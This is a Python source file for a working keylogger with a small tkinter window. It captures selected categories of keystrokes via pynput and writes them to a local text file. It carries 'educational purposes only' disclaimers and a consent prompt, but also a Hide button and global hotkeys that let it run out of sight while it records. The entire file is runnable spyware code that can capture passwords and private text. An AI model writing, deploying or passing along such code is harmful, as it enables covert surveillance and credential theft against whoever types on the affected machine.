#for educational purposes only
#requires permission from the system owner
import tkinter as tk
from tkinter import messagebox
from pynput import keyboard

FUNCTION_KEYS = [
    keyboard.Key.f1, keyboard.Key.f2, keyboard.Key.f3, keyboard.Key.f4,
    keyboard.Key.f5, keyboard.Key.f6, keyboard.Key.f7, keyboard.Key.f8,
    keyboard.Key.f9, keyboard.Key.f10, keyboard.Key.f11, keyboard.Key.f12
]

class Keylogger:
    def __init__(self, file_path="keylogged.txt", char_var=None, num_var=None, special_var=None, func_var=None):
        self.log = ""
        self.listener = None
        self.is_logging = False
        self.file_path = file_path
        self.char_var = char_var
        self.num_var = num_var
        self.special_var = special_var
        self.func_var = func_var

    def on_press(self, key):
        try:
            if hasattr(key, 'char'):
                if self.char_var.get() and key.char.isalpha():
                    self.log += key.char
                elif self.num_var.get() and key.char.isdigit():
                    self.log += key.char
                elif self.special_var.get() and key.char in "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~":
                    self.log += key.char
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            elif self.func_var.get() and key in FUNCTION_KEYS:
                self.log += f" {key.name} "
        except AttributeError:
            pass

    def start_logging(self):
        self.is_logging = True
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        self.is_logging = False
        if self.listener:
            self.listener.stop()
        try:
            with open(self.file_path, "a") as file:
                file.write(self.log)
        except IOError as e:
            messagebox.showerror("Error", f"Failed to write to file: {e}")
        self.log = ""

    def get_file_path(self):
        return self.file_path

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger")
        self.root.geometry("300x250")

        self.char_var = tk.BooleanVar()
        self.num_var = tk.BooleanVar()
        self.special_var = tk.BooleanVar()
        self.func_var = tk.BooleanVar()

        self.keylogger = Keylogger(file_path="keylogged.txt", char_var=self.char_var, num_var=self.num_var, special_var=self.special_var, func_var=self.func_var)

        self.create_widgets()
        self.setup_global_hotkeys()

    def create_widgets(self):
        tk.Label(self.root, text="For educational purposes only.").pack()
        tk.Label(self.root, text="Requires permission from the system owner.").pack()

        tk.Checkbutton(self.root, text="Characters", variable=self.char_var).pack()
        tk.Checkbutton(self.root, text="Numbers", variable=self.num_var).pack()
        tk.Checkbutton(self.root, text="Special Characters", variable=self.special_var).pack()
        tk.Checkbutton(self.root, text="Function Keys", variable=self.func_var).pack()

        self.start_button = tk.Button(self.root, text="Start", command=self.ask_for_consent)
        self.start_button.pack()

        self.stop_button = tk.Button(self.root, text="Stop", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack()

        self.hide_button = tk.Button(self.root, text="Hide", command=self.hide_window, state=tk.DISABLED)
        self.hide_button.pack()

        self.file_path_label = tk.Label(self.root, text="")
        self.file_path_label.pack()

    def ask_for_consent(self):
        if not (self.char_var.get() or self.num_var.get() or self.special_var.get() or self.func_var.get()):
            messagebox.showwarning("Warning", "Please select at least one logging option.")
            return
        consent = messagebox.askyesno("Consent", "Do you consent to start keylogging?")
        if consent:
            self.start_keylogger()

    def start_keylogger(self):
        self.keylogger.start_logging()
        self.file_path_label.config(text=f"Logging to: {self.keylogger.get_file_path()}")
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.hide_button.config(state=tk.NORMAL)

    def stop_keylogger(self):
        self.keylogger.stop_logging()
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.hide_button.config(state=tk.DISABLED)
        messagebox.showinfo("Keylogger", f"Logs saved to: {self.keylogger.get_file_path()}")

    def hide_window(self):
        self.root.withdraw()

    def show_window(self):
        self.root.deiconify()

    def setup_global_hotkeys(self):
        def on_activate_show():
            self.show_window()

        def on_activate_stop():
            self.stop_keylogger()
            self.root.quit()

        self.hotkey_listener = keyboard.GlobalHotKeys({
            '<ctrl>+<shift>+h': on_activate_show,
            '<ctrl>+<shift>+t': on_activate_stop})
        self.hotkey_listener.start()

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
